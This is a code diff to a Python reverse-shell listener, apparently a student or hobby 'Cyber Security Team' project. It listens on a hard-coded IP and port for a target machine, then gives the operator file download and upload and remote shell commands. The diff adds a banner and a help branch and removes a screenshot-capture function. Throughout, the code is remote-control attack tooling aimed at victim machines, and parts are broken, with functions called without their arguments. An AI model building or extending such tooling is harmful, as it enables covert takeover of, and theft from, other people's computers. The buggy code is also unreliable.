@@ -1,7 +1,25 @@
 import socket
 import os
-listener_ip = '192.168.0.108'
+import subprocess
+
+listener_ip = '192.168.0.119'
 listener_port = 6996
+
+banner = """
+    ______      __                 _____                      _ __ 
+  / ____/_  __/ /_  ___  _____   / ___/___  _______  _______(_) /___  __
+ / /   / / / / __ \/ _ \/ ___/   \__ \/ _ \/ ___/ / / / ___/ / __/ / / /
+/ /___/ /_/ / /_/ /  __/ /      ___/ /  __/ /__/ /_/ / /  / / /_/ /_/ / 
+\____/\__, /_.___/\___/_/      /____/\___/\___/\__,_/_/  /_/\__/\__, /  
+  ___/____/                              ____                  /____/   
+ /_  __/__  ____ _____ ___              ( __ )                          
+  / / / _ \/ __ `/ __ `__ \   ______   / __  |                          
+ / / /  __/ /_/ / / / / / /  /_____/  / /_/ /                           
+/_/  \___/\__,_/_/ /_/ /_/            \____/                            
+
+Firts time huh? Enter "help" command for help
+												                         """
+
 
 def download(file_name):
     file = os.path.join(os.path.dirname(file_name))
@@ -9,14 +27,6 @@ def download(file_name):
     data_recv = target.recv(2048)
     file_recv.write(data_recv)
     file_recv.close()
-
-def screenshot():
-    num = 1
-    sc = open('ScreenShot/Screenshot_%d'%num, 'wb')
-    img = target.recv(2048)
-    sc.write(img)
-    sc.close()
-
 
 def upload(file_name):
     file_upload = open(file_name, 'rb')
@@ -31,6 +41,8 @@ def shell_command():
         if command == 'q':
             target.close()
             break
+        elif command == "help":
+            continue
         elif command[:2] == 'cd' and len(command) > 1:
             continue
         elif command[:5] == 'mkdir' and len(command) > 1:
@@ -40,7 +52,6 @@ def shell_command():
                 download()
             except:
                 continue
-
         elif command[:6] == 'upload' and len(command) > 1:
             try:
                 upload()
@@ -64,6 +75,7 @@ def listener():
     print("[+] Get connection from target. Starting shell command...\n")
 
 if __name__ == "__main__":
+    print(banner)
     listener()
     shell_command()
     sock.close()
